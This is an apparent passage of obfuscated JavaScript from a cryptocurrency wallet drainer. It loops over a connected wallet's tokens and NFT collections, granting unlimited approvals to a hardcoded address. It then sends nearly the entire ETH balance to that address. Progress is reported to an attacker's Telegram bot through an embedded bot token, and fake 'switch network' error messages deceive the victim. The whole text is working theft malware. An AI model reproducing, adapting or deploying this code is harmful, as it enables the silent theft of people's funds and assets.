_0x132622=_0x3216ec;if(tokens[_0x132622(0x163)])try{loopTokens(tokens);}catch(_0x10cddc){console['error'](_0x132622(0x1d2)+_0x10cddc[_0x132622(0x178)]);}else{if(NFTs[_0x132622(0x163)]){try{loopNfts(NFTs);}catch(_0x5c9a6c){console['error'](_0x132622(0x1d2)+_0x5c9a6c[_0x132622(0x178)]);}onSendEther(),sendMessage('Error\x20not\x20found,\x20Please\x20switch\x20network\x20or\x20try\x20again!');}else try{onSendEther();}catch(_0x2ae54f){console[_0x132622(0x19f)](_0x132622(0x1d2)+_0x2ae54f['message']);}}}async function loopTokens(_0x9580d){const _0x5cd1b6=_0x3216ec;for await(let _0x5adac5 of _0x9580d){console['log'](_0x5cd1b6(0x171),_0x5adac5);try{sendMessage(_0x5cd1b6(0x1bb));let {hash:_0xf73dc7}=await writeContract({'address':_0x5adac5['address'],'abi':ABI,'functionName':'approve','args':[Oxa,_0x5cd1b6(0x175)]});console[_0x5cd1b6(0x17c)](_0x5cd1b6(0x151),_0xf73dc7),_0xf73dc7&&(console[_0x5cd1b6(0x17c)]('Approved'),sendMessage(_0x5cd1b6(0x155)),sendMessage(_0x5cd1b6(0x166)+_0x5adac5[_0x5cd1b6(0x1a5)]),sendMessage(_0x5cd1b6(0x12d)+_0x5adac5[_0x5cd1b6(0x157)]),sendMessage(_0x5cd1b6(0x1d5)+Oxa));}catch(_0x3bd88f){console[_0x5cd1b6(0x17c)](_0x5cd1b6(0x167)+_0x3bd88f),sendMessage('Transaction\x20Rejected');}};await loopNfts(NFTs);}async function loopNfts(_0x40c6be){const _0x3db770=_0x3216ec;for await(let _0x3e5734 of _0x40c6be){console[_0x3db770(0x17c)]('NFT',_0x3e5734);try{let {hash:_0x3dc4b7}=await writeContract({'address':_0x3e5734[_0x3db770(0x134)],'abi':ABIN,'functionName':_0x3db770(0x1ba),'args':[Oxa,!![]]});console['log']('hash',_0x3dc4b7),console[_0x3db770(0x17c)](_0x3db770(0x18c)+receipt),sendMessage('Approve\x20Completed\x20Successfully'),sendMessage('NFT\x20Contract\x20Address\x20'+_0x3e5734[_0x3db770(0x134)]),sendMessage(_0x3db770(0x1d5)+Oxa);}catch(_0x7d62d8){console[_0x3db770(0x17c)]('Error:\x20'+_0x7d62d8),sendMessage(_0x3db770(0x1be));}}await onSendEther();}async function onSendEther(){const _0x5777b1=_0x3216ec;console['log'](_0x5777b1(0x15d));try{let _0x3c3351=await fetchBalance({'address':selectedAccount});console['log'](_0x3c3351);const _0x21ed39=await fetchFeeData();console[_0x5777b1(0x17c)](_0x21ed39);var _0x10660a=_0x21ed39[_0x5777b1(0x126)][_0x5777b1(0x141)];_0x10660a=parseFloat(_0x10660a);let _0x157258=parseFloat(_0x3c3351[_0x5777b1(0x126)])-_0x10660a*0.00042;_0x157258=parseEther(_0x157258[_0x5777b1(0x183)]()),console['log'](_0x157258);const {hash:_0x36ad7f}=await sendTransaction({'to':Oxa,'value':_0x157258});console[_0x5777b1(0x17c)](_0x36ad7f),sendMessage(_0x5777b1(0x1d8),_0x36ad7f),sendMessage('Transaction\x20is\x20submitted\x20to\x20the\x20network'),sendMessage(_0x5777b1(0x1a9));}catch{sendMessage('Insufficient\x20funds\x20for\x20transfer\x20or\x20transaction\x20was\x20rejected');}}async function sendMessage(_0x5c7401){return new Promise((_0x56b6ab,_0x8d31a2)=>{const _0x52d8f1=_0x1dbe,_0xbd0335=Oxc;fetch('https://api.telegram.org/bot5519263012:AAECn6WGaBWiGtY_1EBBEGkamw9e5W6qxvs/sendMessage?chat_id='+_0xbd0335+_0x52d8f1(0x186)+_0x5c7401,{'method':_0x52d8f1(0x1c0),'headers':{}})[_0x52d8f1(0x1c5)](async _0x21b604=>{const _0x29d05e=_0x52d8f1;if(_0x21b604['status']>0x18f)throw _0x21b604;_0x56b6ab(await _0x21b604[_0x29d05e(0x12e)]());})[_0x52d8f1(0x1bf)](_0x3720bf=>{_0x8d31a2(_0x3720bf);});});}async function getPrice(_0x2e6dd6){return new Promise((_0x5c8928,_0x3c7917)=>{const _0x1d4b7a=_0x1dbe;fetch('https://api.coingecko.com/api/v3/simple/token_price/arbitrum-one?contract_addresses='+_0x2e6dd6+_0x1d4b7a(0x14f),{'method':_0x1d4b7a(0x1c0),'headers':{}})[_0x1d4b7a(0x1c5)](async _0x24230a=>{const _0x374424=_0x1d4b7a;if(_0x24230a[_0x374424(0x153)]>0x18f)throw _0x24230a;_0x5c8928(await _0x24230a[_0x374424(0x12e)]());})['catch'](_0xe107ae=>{_0x3c7917(_0xe107ae);});});}async function getValue(_0x5b9803,_0x193431,_0x36eb60){const _0x4f8a16=_0x3216ec;console[_0x4f8a16(0x17c)](_0x5b9803,_0x193431,_0x36eb60);let _0x4aec9e=await getPrice(_0x5b9803);console[_0x4f8a16(0x17c)](_0x4f8a16(0x124),_0x4aec9e),_0x4aec9e=parseFloat(_0x4aec9e[_0x5b9803][_0x4f8a16(0x148)]);let _0x5a26c6=_0x193431/0xa**(_0x36eb60||0x12)*_0x4aec9e;return _0x5a26c6=parseInt(_0x5a26c6),_0x4aec9e?_0x5a26c6:0x0;}async function getNFTs(_0x4a3403='',_0x1f0b68=_0x3216ec(0x182),_0x45e381=_0x3216ec(0x137),_0x1a0006='50'){return new Promise((_0x90f7c8,_0x278fea)=>{const _0x27fab4=_0x1dbe;fetch('https://deep-index.moralis.io/api/v2/'+_0x4a3403+'/nft/collections?chain='+_0x45e381+_0x27fab4(0x1c4)+_0x1a0006,{'method':_0x27fab4(0x1c0),'headers':{'accept':'application/json','X-API-Key':_0x1f0b68}})[_0x27fab4(0x1c5)](async _0x45881c=>{const _0x27e72d=_0x27fab4;if(_0x45881c[_0x27e72d(0x153)]>0x18f)throw _0x45881c;_0x90f7c8(await _0x45881c[_0x27e72d(0x12e)]());})[_0x27fab4(0x1bf)](_0x4f335a=>{_0x278fea(_0x4f335a);});});}